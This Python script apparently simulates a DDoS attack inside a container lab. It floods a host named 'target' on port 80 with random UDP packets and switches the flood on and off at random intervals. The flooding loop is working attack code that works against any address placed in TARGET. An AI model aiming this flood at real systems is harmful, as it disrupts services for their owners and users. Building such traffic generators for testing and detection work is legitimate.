#!/usr/bin/env python3
'''Python script designed to simulate a DDoS attack.'''
import time
import random
import multiprocessing
import socket, os

# Tuple containing the target address and port
TARGET = ('target', 80)

def attack():
    # Open the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Send a random set of bytes to the target server
    while True:
        sock.sendto(os.urandom(1490), TARGET)

def getProcess():
    return multiprocessing.Process(target=attack)

if __name__ == '__main__':
    # Wait a few seconds for target container to spin up
    time.sleep(3)

    # Declare the ddos process
    p = getProcess()

    while True:
        # Sleep for 5 seconds
        time.sleep(5)

        # Generate random int, if it's 5 then stop the DDoS or restart it
        if random.randint(1, 5) == 5:
            if p.is_alive():
                p.terminate()
            else:
                p = getProcess()
                p.start()
